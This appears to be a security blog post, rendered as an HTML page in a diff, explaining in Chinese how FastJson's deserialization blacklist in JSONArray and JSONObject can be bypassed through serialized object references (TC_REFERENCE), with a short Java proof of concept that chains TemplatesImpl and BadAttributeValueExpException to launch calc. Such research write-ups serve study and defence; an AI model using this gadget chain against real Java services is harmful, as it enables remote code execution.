@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            FastJson(3): fj与反序列化
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="fastjson-与反序列化"><a href="#fastjson-与反序列化" class="headerlink" title="fastjson 与反序列化"></a>fastjson 与反序列化</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一部分是和parseObject漏洞分开的，可以说是单独的存在，为反序列化服务。</p>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</a></p>
+<p><code>JSONArray#toString</code>和<code>JSONObject#toString</code>可调用对象的getter。</p>
+<p>在&lt;&#x3D; 1.2.48，上述调用getter无限制。</p>
+<p>在&gt;&#x3D; 1.2.49之后，这两个类有了自己的readObject，恢复自身对象时，new 一个安全输入流来readObject。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/fastjson(3)-unser/image-20240301132548701.png" alt="image-20240301132548701.png"></p>
+<p>这个输入流实现了resolveClass，在其中调用checkAutoType检查要反序列化的类是否合法。</p>
+<p>下面就是针对此处的绕过。</p>
+<h1 id="handles"><a href="#handles" class="headerlink" title="handles"></a>handles</h1><p>由于黑名单在resolveClass，那么需要找到何时不会调用resolveClass。</p>
+<p>大师傅们发现，当反序列化一个引用类型的时候，不会调用resolveClass。</p>
+<p>什么是引用类型？</p>
+<p>序列化数据前，要先写该数据属于何种类型。若一个数据为对象，则写入<code>TC_OBJECT</code>，后面再跟该对象的数据。若一个数据为引用，则写入<code>TC_REFERENCE</code>。</p>
+<p>设想，若需要序列化10个<strong>相同</strong>对象，若每个对象都写入全部数据，则造成很多冗余，此时就该用到引用。</p>
+<p>大概作用过程：第一次写入对象A，写入<code>TC_OBJECT</code>+A的数据，将对象A存入handles。第二次写入对象A，在handles里查找到A，说明之前写过了，则写入<code>TC_REFERENCE</code>+A的索引。</p>
+<p>当readObject时，遇到<code>TC_REFERENCE</code>，则通过索引查找到实际对象。</p>
+<p>这样不会调用resolveClass。</p>
+<p>所以绕过思路，准备一个可以装很多对象的容器，先装入恶意对象，再装入JSONArray或JSONObject。其中JSONArray里也有相同的恶意对象。序列化第一个恶意对象时不受限制，序列化第二个恶意对象时，由于读的是<code>TC_REFERENCE</code>，则不调用resolveClass，黑名单不起作用。</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void bypass() throws Exception&#123;</span><br><span class="line">    TemplatesImpl calc = Gadget.getTemplateImpl(&quot;calc&quot;);</span><br><span class="line">    ArrayList&lt;Object&gt; objects = new ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    JSONArray objects1 = new JSONArray();</span><br><span class="line">    objects1.add(calc);</span><br><span class="line">    BadAttributeValueExpException bd = Gadget.getBadAttributeValueExpException(objects1);</span><br><span class="line">    objects.add(calc);</span><br><span class="line">    objects.add(bd);</span><br><span class="line">    Util.unserialize(Util.serialize(objects));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/fastjson(3)-unser/image-20240301140734057.png" alt="image-20240301140734057.png"></p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson-%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">fastjson 与反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#handles"><span class="toc-text">handles</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
